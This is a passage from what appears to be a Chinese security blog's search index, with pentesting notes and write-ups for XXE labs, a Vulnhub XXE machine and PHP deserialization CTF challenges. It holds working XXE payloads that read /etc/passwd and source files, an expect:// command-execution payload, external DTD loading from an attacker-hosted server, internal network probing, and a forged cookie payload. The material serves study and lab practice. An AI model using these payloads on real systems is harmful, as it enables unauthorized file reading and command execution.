–5901\n\n\n\n\n\n\n\n\n\n弱口令\n认证口令绕过\n拒绝服务攻击–CVE-2015-5239\n权限提升–CVE-2013-6886\n5、Pcanywhere –5632\n\n\n\n\n\n\n\n\n\n拒绝服务攻击\n权限提升\n代码执行\n6、X11 –6000\n\n\n\n\n\n\n\n\n\n未授权访问–CVE-1999-0526 \n0x05 邮件服务1、SMTP –25&#x2F;465\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n邮件伪造\n2、POP3 –110&#x2F;995\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n3、IMAP –143&#x2F;993\n\n\n\n\n\n\n\n\n\n弱口令\n任意文件读取\n0x06 其他服务1、DNS –53\n\n\n\n\n\n\n\n\n\nDNS区域传输\nDNS劫持\nDNS欺骗\nDNS缓存投毒\nDNS隧道\n2、DHCP –67&#x2F;68\n\n\n\n\n\n\n\n\n\nDHCP劫持\nDHCP欺骗\n3、SNMP –161\n\n\n\n\n\n\n\n\n\n弱口令\n4、Rlogin –512&#x2F;513&#x2F;514\n\n\n\n\n\n\n\n\n\nrlogin登录\n5、Rsync –873\n\n\n\n\n\n\n\n\n\n未经授权访问\n本地权限提升\n6、Zabbix –8069\n\n\n\n\n\n\n\n\n\n远程代码执行\n7、RMI –1090&#x2F;1099\n\n\n\n\n\n\n\n\n\nJAVA反序列化\n8、Docker –2375\n\n\n\n\n\n\n\n\n\n未经授权访问\n0x04 思路1、扫域名，扫ip，扫端口，能扫就扫；\n2、信息搜集才是渗透测试的核心。\n","slug":"漏洞发现-API接口服务类","date":"2022-06-08T07:03:31.000Z","categories_index":"漏洞检测","tags_index":"漏洞检测","author_index":"Aurora"},{"id":"4b54776e740f7d43a9c5a69811a9ccbc","title":"漏洞发现-APP应用类","content":"0x00脑图：\n0x01 思路反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试。\n0x02 工具1、Burpsuite\n2、Charlesproxy\n3、apk一键提取\n0x03 案例大概思路：\n1、利用Burpsuite或者其他代理工具进行抓包提取URL，使用BP时注意配置好https进行抓包，否则抓不到APP数据包，APP数据包大多采用https；可以利用BP的筛选模块，将获取到的URL进行参数的筛选，之后进行测试；\n2、若涉及到其他协议（非WEB协议）使用wireshark进行分析；\n3、也可使用apk一键提取，直接导出相关URL进行分析；\n4、使用Burp筛选联动其他漏洞扫描工具打出组合拳，例如联动Xray或者AWVS等，使漏洞最大化。\n0x04 总结当把APP抓包提取URL后，其实就是一个Web网站，之后就可以利用Web渗透的思路去测试。\n0x05由于没有找到违法且合适测试的APP，大概就讲一下APP渗透的思路吧。\n","slug":"漏洞发现-APP应用类","date":"2022-06-07T14:42:42.000Z","categories_index":"漏洞检测","tags_index":"漏洞检测","author_index":"Aurora"},{"id":"70588e66e16ac1afefd26a13c036cac3","title":"漏洞发现-Web应用类","content":"0x00脑图：\n\n0x01 已知CMS例如常见的 dedecms.discuz,wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。\n已知CMS可以利用漏洞平台搜索关键字搜索相关程序的漏洞。\n0x02 开发框架例如常见的 thinkphp，spring,flask 等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。\n可利用漏洞框架进行针对性扫描攻击，例如cmsscan，wpscan，TPscan等等针对某一种框架进行漏洞挖掘。\n0x03 未知CMS如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构；\n针对此类的源码程序测试思路：能识别二次开发就按已知 CMS 思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。\n可以利用xray，awvs，appscan等工具进行漏扫；\n或者人工探测应用功能，URL参数，盲猜测试等进行漏洞挖掘。\n0x04 案例利用seebug可以搜索thikphp，可以看到会有相关漏洞，点击Thinkphp 5.0.x 远程代码执行漏洞还有相关补丁PoC等等\n\n\n","slug":"漏洞发现-Web应用类","date":"2022-06-07T09:28:00.000Z","categories_index":"漏洞检测","tags_index":"漏洞检测","author_index":"Aurora"},{"id":"d10b61f7a1925f3d1f2bb509e6d073e3","title":"漏洞发现-操作系统类漏洞","content":"0x00脑图\n\n0x01 漏洞探针系统漏洞由于手工检测操作系统漏洞很复杂很麻烦，由此利用漏洞探针工具检测漏洞。\n漏扫工具：Goby,Nmap,Nessus\nNmap的一些第三方漏洞库：\nNmap –script&#x3D;vuln 默认 nse 插件扫描\nNmap vulscan vulners 调用第三方库探针\n参考文章：https://www.cnblogs.com/shwang/p/12623669.html\n0x02 漏洞类型1、远程执行\n2、权限提升\n3、缓冲区溢出\n0x03 漏洞利用1、漏洞利用框架：\nMetasploit、Searchsploit\n利用Searchsploit搜索漏洞，之后利用。\n漏洞库网站：https://www.exploit-db.com/\nhttps://www.cnvd.org.cn\nhttps://www.seebug.org\n2、单点EXP\n针对某个漏洞的脚本等等\n3、复现文章\n看各种文章。\n","slug":"漏洞发现-操作系统类漏洞","date":"2022-06-07T09:20:13.000Z","categories_index":"漏洞检测","tags_index":"漏洞检测","author_index":"Aurora"},{"id":"b0d1a06dcd6e0826834acbe52fab1564","title":"XXE本地靶场","content":"0x00 XXE-Lab0x00随便输入用户名和密码抓包观察：\n\n可以看到用户名和密码是使用XML格式进行传输，并且数据包中Content-Type: 字段为application/xml;charset=utf-8带有xml字样，X-Requested-With: 字段为XMLHttpRequest是XML的HTTP请求，回复包中也是XML格式，由此就能看出存在XXE漏洞。\n0x01进行XXE注入：\n构造payload：读取D盘下的test.txt文件\n直接构造XML声明和DTD部分，引用外部实体去尝试读取&#x2F;etc&#x2F;passwd文件：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE admin [\n&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;]&gt;\n&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;\n这里元素中引用外部实体参数admin，格式：&amp;admin;\n\n\n这里除了读取test.txt文件，也可以读取一些敏感文件，可结合XXE实现任意文件读取漏洞。\n0x02 构造payload的几种方式方式一、直接通过外部实体声明：\nXML内容：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE a [  \n&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; \n&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;\n\n\n\n方式二、外部实体声明（通用实体）+外部DTD文件：\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;\n&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n\n\n\n\n\n\n\n\n\n\n注意：这里的 http://XXX/test.dtd 是攻击者自己服务器上的文件。\n方式三、外部实体声明（参数实体） + 引入外部实体声明：：\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE a[\n\t&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;\n\t%d;\n]&gt;\n&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n\ntest.dtd 内容:\n&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n\n注意这种方式必须要先引用参数实体，才能引用通用实体，且缺一不可。\n0x03 RCE在安装 expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 因为PHP的 expect 并不是默认安装扩展，所以命令执行比较难利用，但不排除有幸运的情况。\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;cat &#x2F;&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;\n&lt;&#x2F;root&gt;\n\n\n\n0x04 内网探测XML 外部实体中是可以使用http:&#x2F;&#x2F;协议，可以利用该请求去探查内网。\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;\n&lt;&#x2F;root&gt;\n\n若对方禁用外部实体这样的攻击则无效。\n","slug":"XXE本地靶场","date":"2022-06-06T00:54:30.000Z","categories_index":"XXE","tags_index":"XXE","author_index":"Aurora"},{"id":"d6b5c98aeeb32013f5e3f6af5fdb7e80","title":"Vulnhub-XXE靶场","content":"0x00靶机地址：https://download.vulnhub.com/xxe/XXE.zip\n攻击机：Ninjitsu OS\n0x01打开靶机\n\n0x02查看攻击机ip地址：\n\n使用nmap扫描网段，查找靶机ip：\nnmap -sS 192.168.216.1&#x2F;24\n\n\n扫描到靶机地址，并且开放80端口。\n0x03使用浏览器打开其web页面：\n\n0x04使用御剑扫描后台文件：\n看到有robots.txt文件，访问robots.txt文件：\n有&#x2F;xxe&#x2F;目录和admin.php文件。\n0x05访问&#x2F;xxe&#x2F;目录可以看到有登录框：\n\n0x06随便输入账号密码抓包，可以看到是xml格式传输数据：\n\n可以知道存在XXE漏洞。\n0x07插入攻击语句进行XXE注入：\npayload：利用php伪协议读取xxe.php文件\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;\n]&gt;\n&lt;roo\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;\n\n注：注入时需要将admin更改为：&amp;admin;；并且!ENTITY 后需要和&lt;name&gt;标签处相同，为admin。\n\n得到数据包为base64加密，拿去解密都得到：\n解密前：\nPD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwokeG1sZmlsZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokZG9tID0gbmV3IERPTURvY3VtZW50KCk7CiRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKJGluZm8gPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKJG5hbWUgPSAkaW5mby0+bmFtZTsKJHBhc3N3b3JkID0gJGluZm8tPnBhc3N3b3JkOwoKZWNobyAiU29ycnksIHRoaXMgJG5hbWUgbm90IGF2YWlsYWJsZSEiOwo&#x2F;Pgo&#x3D;\n\n解密后：\n&lt;?php\nlibxml_disable_entity_loader (false);\n$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);\n$dom &#x3D; new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$info &#x3D; simplexml_import_dom($dom);\n$name &#x3D; $info-&gt;name;\n$password &#x3D; $info-&gt;password;\necho &quot;Sorry, this $name not available!&quot;;\n?&gt;\n\n解密后为xxe.php的源代码：\n\n0x08查看admin.php源代码：\npayload更改为admin.php：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;\n\n得到admin.php的源码：\n\n解密后源码：\n&lt;?php\n   session_start();\n?>\n\n\n&lt;html lang = \"en\">\n   \n   &lt;head>\n      &lt;title>admin&lt;/title>\n      &lt;link href = \"css/bootstrap.min.css\" rel = \"stylesheet\">\n      \n      &lt;style>\n         body &#123;\n            padding-top: 40px;\n            padding-bottom: 40px;\n            background-color: #ADABAB;\n         &#125;\n         \n         .form-signin &#123;\n            max-width: 330px;\n            padding: 15px;\n            margin: 0 auto;\n            color: #017572;\n         &#125;\n         \n         .form-signin .form-signin-heading,\n         .form-signin .checkbox &#123;\n            margin-bottom: 10px;\n         &#125;\n         \n         .form-signin .checkbox &#123;\n            font-weight: normal;\n         &#125;\n         \n         .form-signin .form-control &#123;\n            position: relative;\n            height: auto;\n            -webkit-box-sizing: border-box;\n            -moz-box-sizing: border-box;\n            box-sizing: border-box;\n            padding: 10px;\n            font-size: 16px;\n         &#125;\n         \n         .form-signin .form-control:focus &#123;\n            z-index: 2;\n         &#125;\n         \n         .form-signin input[type=\"email\"] &#123;\n            margin-bottom: -1px;\n            border-bottom-right-radius: 0;\n            border-bottom-left-radius: 0;\n            border-color:#017572;\n         &#125;\n         \n         .form-signin input[type=\"password\"] &#123;\n            margin-bottom: 10px;\n            border-top-left-radius: 0;\n            border-top-right-radius: 0;\n            border-color:#017572;\n         &#125;\n         \n         h2&#123;\n            text-align: center;\n            color: #017572;\n         &#125;\n      &lt;/style>\n      \n   &lt;/head>\n\t\n   &lt;body>\n      \n      &lt;h2>Enter Username and Password&lt;/h2> \n      &lt;div class = \"container form-signin\">\n         \n         &lt;?php\n            $msg = '';\n            if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) \n               &amp;&amp; !empty($_POST['password'])) &#123;\n\t\t\t\t\n               if ($_POST['username'] == 'administhebest' &amp;&amp; \n                  md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') &#123;\n                  $_SESSION['valid'] = true;\n                  $_SESSION['timeout'] = time();\n                  $_SESSION['username'] = 'administhebest';\n                  \n                echo \"You have entered valid use name and password &lt;br />\";\n\t\t$flag = \"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>\";\n\t\techo $flag;\n               &#125;else &#123;\n                  $msg = 'Maybe Later';\n               &#125;\n            &#125;\n         ?>\n      &lt;/div> &lt;!-- W00t/W00t -->\n      \n      &lt;div class = \"container\">\n      \n         &lt;form class = \"form-signin\" role = \"form\" \n            action = \"&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']); \n            ?>\" method = \"post\">\n            &lt;h4 class = \"form-signin-heading\">&lt;?php echo $msg; ?>&lt;/h4>\n            &lt;input type = \"text\" class = \"form-control\" \n               name = \"username\" \n               required autofocus>&lt;/br>\n            &lt;input type = \"password\" class = \"form-control\"\n               name = \"password\" required>\n            &lt;button class = \"btn btn-lg btn-primary btn-block\" type = \"submit\" \n               name = \"login\">Login&lt;/button>\n         &lt;/form>\n\t\t\t\n         Click here to clean &lt;a href = \"adminlog.php\" tite = \"Logout\">Session.\n         \n      &lt;/div> \n      \n   &lt;/body>\n&lt;/html>\n\n\n从源码中看到：\nif ($_POST['username'] == 'administhebest' &amp;&amp; \n                  md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') \n\n这里存放着用户名和密码，密码md5加密，拿去解密得到密码：\n\n0x09登录：访问&#x2F;xxe&#x2F;admin.php进行登录。\n注：上面获取的用户名和密码是从admin.php文件中获取的，因此登录也是在admin.php页面中，而不是&#x2F;xxe&#x2F;目录下的登录框。\n\n点击login后出现Here is the Flag：\n\n点击Flag跳转页面，并且找不到文件，观察url这时已经跳转到了根目录\n0x10这里接着进行XXE注入，将根目录下的flagmeout.php文件源码读取出来：\npayload：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flagmeout.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;\n\n解密得到flag，发现flag内容被加密了：\n\n这是base32加密，使用在线工具进行解密，解密得到base64：\n接着解密得到flag.php文件的访问路径：\n\n0x11继续XXE注入查看flag.php源码：\npayload：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;.flag.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;\n\n解密后得到乱码：\n0x12最后使用phpstudy创建1.php文件访问得到flag：\nflag：SAFCSP&#123;xxe_is_so_easy&#125; \n\n\n0x13 总结这个靶机总体来说不是很难，玩过之后对XXE会有更深的了解，最主要还是细心观察。\n","slug":"Vulnhub-XXE靶场","date":"2022-06-05T14:38:38.000Z","categories_index":"XXE","tags_index":"XXE","author_index":"Aurora"},{"id":"f59b4912b599c61d7ef7202907a014a6","title":"XXE和XML-利用检测绕过","content":"0x00脑图：\n0x01 XML简介###0x00\n1、XML指可扩展标记语言，它被设计用来传输和存储数据。（HTML被用来显示数据）2、XML没有预定义的标签，需要自行定义标签3、XML是不作为的，及它不存在任何的行为，只是用来结构化、传输和存储信息4、它仅仅是纯文字5、XML 是独立于软件和硬件的信息传输工具。（更多介绍详见w3school的介绍）\nw3school介绍：\nhttps://www.w3school.com.cn/xml/xml_intro.asp\n0x01 XML结构&lt;!--声明部分-->\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\">\n&lt;!--文档类型定义部分-->\n&lt;! DOCTYPE note[\n\t&lt;!ELEMENT file SYSTEM \"file:///var/passwd\">\n]>\n&lt;!--内容部分-->\n&lt;letter date=\"2021/10/20\">\n \t&lt;to>xxx&lt;/to>\n \t&lt;from>gs&lt;/from>\n\t&lt;body>记得去外滩！&lt;/body>\n\t&amp;file;\n&lt;/letter>\n\n第2行 是XML声明，它定义了XML的版本（version）和字符编码（encoding）\n第4到6行是文档类型定义（DTD）内容\n第5行引入了外部实体\n第8-13行是内容部分\n第8行的&lt;letter>是根节点，date是它的属性\n第9行到第12行是具体的内容（&lt;to>、&lt;from>、&lt;body>），称为子元素\n第12行显示了引入的外部实体\n第13行则是根节点的闭标签\n\n\n\n0x02 XML语法说明1、每个标签都对应有一个闭合的标签。\n2、XML文档必须包含根节点。文档中的所有元素形成了一颗文档树，这颗树从根部开始并扩展到最底端。\n3、上下层级的元素存在父子的关系，同级的为同胞（兄弟姐妹）\n4、所有的元素都可以拥有子元素、文本内容和属性\n5、XML标签大小写敏感\n6、XML标签必须正确的嵌套\n7、XML中的属性需要加引号\n8、XML中的一些特殊字符无法直接在标签内部当作文本使用。比如&lt;message&gt;123 &lt; 321&lt;/message&gt;，此时的&lt;不再是小于号，而会被解析器当作新元素的开始。因此此处需要使用实体引用：&amp;lt;。实体引用对照表如下：\n\n\n\n实体引用\n符号\n\n\n\n&amp;lt;\n&lt;\n\n\n&amp;gt;\n&gt;\n\n\n&amp;amp;\n&amp;\n\n\n&amp;apos;\n’\n\n\n&amp;quot;\n“\n\n\n参考文章：https://blog.csdn.net/weixin_43876438/article/details/120906582\n0x03XML文档类型定义包括：内部声明DTD格式：＜!DOCTYPE 根元素［元素声明］＞。引用外部DTD格式：＜!DOCTYPE 根元素 SYSTEM ”文件名 ”＞。在DTD中进行实体声明时，将使用ENTITY关键字来声明 。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明 。内部声明 实体格式：＜!ENTITY 实体名称 ”实体的值”＞。引用外部 实体格式：＜!ENTITY 实体名称 SYSTEM &quot;URI&quot;＞。\n文档类型定义（DTD）\n&lt;!DOCTYPE Pwn [\n\t&lt;!ENTITY subscribe SYSTEM &quot;secret.txt&quot;&gt;\n]&gt;\n\n\n\n0x04 DTD（Document Type Definition） 文档类型定义\n定义XML文档的合法构建模块:\nDTD声明内部声明DTD：&lt;!DOCTYPE 根元素 [元素声明]&gt;引用外部DTD：&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;或&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;DTD实体定义引用普通文本或特殊字符的快捷方式的变量；通用实体：&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;外部通用实体：&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;或&lt;!ENTITY 实体名 PUBLIC &quot;public_ID&quot; &quot;URI/URL&quot;&gt;通用实体引用：&amp;实体名;参数实体：&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;（%后有个空格）外部参数实体：&lt;!ENTITY % 实体名 SYSTEM &quot;URI/URL&quot;&gt;参数实体引用：%实体名;参数实体只能在DTD中被引用\n0x05  文档元素（XML元素）定义：&lt;!ELEMENT 元素名 元素类型&gt; 命名规则：\n\n名称可以包含字母、数字以及其他的字符；\n名称不能以数字或者标点符号开始；\n名称不能以字母 xml（或者 XML、Xml 等等）开始；\n名称不能包含空格；\n\n0x02 XML和XXE及区别XML和XXE：\nXML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\n区别：\nXML 被设计为传输和存储数据，其焦点是数据的内容。\nHTML 被设计用来显示数据，其焦点是数据的外观。\nHTML 旨在显示信息 ，而 XML 旨在传输信息。\n0x03 各种脚本类型可使用的协议\n\n\nlibxml2\nPHP\nJava\n.NET\n\n\n\nfile，http，ftp\nfile，http，ftp，php，compress.zlib，compress.bzip2，data，glob，phar\nhttp，https，ftp，file，jar，netdoc，mailto，gopher *\nfile，http，https，ftp\n\n\n0x04 XXE漏洞0x00 危害\n任意文件读取。可以配合任意文件上传漏洞实现getshell\n通过某些协议（比如安装expect扩展的PHP环境中）可以实现远程命令执行\n通过HTTP协议探测内网端口\n\n0x01 防护\n使用开发语言提供的禁用外部实体来防止注入\n过滤用户提交的XML数据。比如过滤掉&lt;!DOCTYPE或&lt;!ENTITY\n\n0x02 攻击方式方式一，构建如下payload：]&gt;\n通过file协议可以实现任意文件读取\n方式二，构建payload：&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;http://127.0.0.1:81&quot;&gt;]&gt;\n通过HTTP协议可以实现端口探测\n方式三，构建payload：&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;expect://whoami&quot;&gt;]&gt;\n通过expect协议可以执行系统命令\n0x03 漏洞发现利用XXE-labs的学习可以检测发现XXE漏洞。\n在数据包爬行目录时候去发现数据包里面有符合XML数据传输的地方，在传输数据地方插入payload即可。\n##0x05 自动化XXE注入工具\n下载链接：https://github.com/enjoiz/XXEinjector\n参考文章：https://www.cnblogs.com/bmjoker/p/9614990.html\n","slug":"XXE和XML-利用检测绕过","date":"2022-06-05T09:15:30.000Z","categories_index":"XXE","tags_index":"XXE","author_index":"Aurora"},{"id":"765364a990a298eaa5bfb6798653b2a8","title":"反序列化-JAVA","content":"0x00脑图：\n0x01 Java中的API实现位置：Java.io.ObjectOutputStream             Java.io.ObjectInputStream\n序列化：ObjectOutputStream 类–&gt;writeObject()\n​\t\t\t\t注：该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中按Java的标准约定是给文件一个.ser扩展名\n反序列化：ObjectInputStream–&gt;readObject()\n​                  注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。\n0x02 序列化和反序列化**序列化 (Serialization)**：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。\n反序列化：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化\n0x03 Java序列化标志参考一段数据以“rO0AB”开头，那么它很可能是Java序列化base64加密的数据\n一段数据以“aced”开头，那么它很可能是Java序列化的16进制\n0x04 涉及靶场及工具1、Webgoat（Java靶场）：\nhttps://github.com/WebGoat/WebGoat/releases\n2、网鼎杯朱雀组-Web-think_java反序列化靶场\n3、Java反序列化工具：\nhttps://github.com/NickstaDB/SerializationDumper\nhttps://github.com/frohoff/ysoserial/releases\n0x05没学过Java，看不懂，以后学完Java再补回来Java安全的内容吧。\n","slug":"反序列化-JAVA","date":"2022-06-05T01:26:42.000Z","categories_index":"反序列化","tags_index":"反序列化","author_index":"Aurora"},{"id":"12fdb6ecdc9fce56588b7231aac6d69e","title":"反序列化靶场","content":"0x00 bugku-CTF-点login咋没反应0x00一道PHP反序列化的CTF题目。\n0x01打开靶场看到有登录框，并且给提示说点了login没有反应\n\n\n0x02查看源代码发现有一个admin.css文件，打开查看\n\n\n0x03可以看到提示try ?28606，试试传入28606看返回结果\n\n可以看到返回了源代码。\n0x04进行一下代码审计：\n代码中有一个变量KEY，值为ctf.bugku.com；并且包含一个flag.php文件，如果设置了以GET方式接收28606这个参数，就显示源代码，否则就将cookie值反序列化之后若是等于KEY值，就输出flag。\n注意：这里的&#x3D;&#x3D;&#x3D;是PHP强类型比较。\n0x05利用PHP在线平台将KEY值序列化输出\n\n0x06抓包，将序列化输出的值放入cookie处，放包，得到flag。\nCookie: BUGKU&#x3D;s:13:&quot;ctf.bugku.com&quot;;\n\n\n\n0x07 总结开始拿到题的时候首先要查看源代码找到admin.css文件找到能够显示源码的参数，之后进行代码审计了解到是PHP反序列化的题目，并且，Cookie提交的参数值为BUGKU，如上图所示，若Cookie提交格式不正确不会出flag，抓包时候若没有Cookie自己加上Cookie字段即可。\n0x01 网鼎杯 2020 青龙组AreUSerialz0x00打开靶场，给到PHP代码：\n&lt;?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler &#123;\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() &#123;\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    &#125;\n\n    public function process() &#123;\n        if($this->op == \"1\") &#123;\n            $this->write();\n        &#125; else if($this->op == \"2\") &#123;\n            $res = $this->read();\n            $this->output($res);\n        &#125; else &#123;\n            $this->output(\"Bad Hacker!\");\n        &#125;\n    &#125;\n\n    private function write() &#123;\n        if(isset($this->filename) &amp;&amp; isset($this->content)) &#123;\n            if(strlen((string)$this->content) > 100) &#123;\n                $this->output(\"Too long!\");\n                die();\n            &#125;\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        &#125; else &#123;\n            $this->output(\"Failed!\");\n        &#125;\n    &#125;\n\n    private function read() &#123;\n        $res = \"\";\n        if(isset($this->filename)) &#123;\n            $res = file_get_contents($this->filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;\n        echo \"[Result]: &lt;br>\";\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i = 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 &amp;&amp; ord($s[$i]) &lt;= 125))\n            return false;\n    return true;\n&#125;\n\nif(isset($_GET&#123;'str'&#125;)) &#123;\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) &#123;\n        $obj = unserialize($str);\n    &#125;\n\n&#125;\n\n\n\n0x01先进行代码审计\n涉及函数：ord() 函数返回字符串中第一个字符的 ASCII 值；\nfile_get_contents() 函数把整个文件读入一个字符串中。\n分块代码分析：\nif(isset($_GET&#123;'str'&#125;)) &#123;\n  $str = (string)$_GET['str'];\n  if(is_valid($str)) &#123;\n    $obj = unserialize($str);\n  &#125;\n//接收字符串使其执行__destruct()函数\n\nfunction is_valid()函数：\nfunction is_valid($s) &#123;\n    for($i = 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 &amp;&amp; ord($s[$i]) &lt;= 125))\n            return false;\n    return true;\n&#125;\n/*\nis_valid()是一层防护,检查传入的str的每个字母的ascii值在32和125之间;是因为protected在序列化之后会出现不可见字符\\00*\\100,不符合要求，这里绕过方法就是直接改成public，原因是php7.1以上的版本对属性类型不敏感类型。而public属性序列化不会出现不可见字符\n*/\n\nfunction __destruct()函数：\n function __destruct() &#123;\n        if($this->op === \"2\")\n            $this->op = 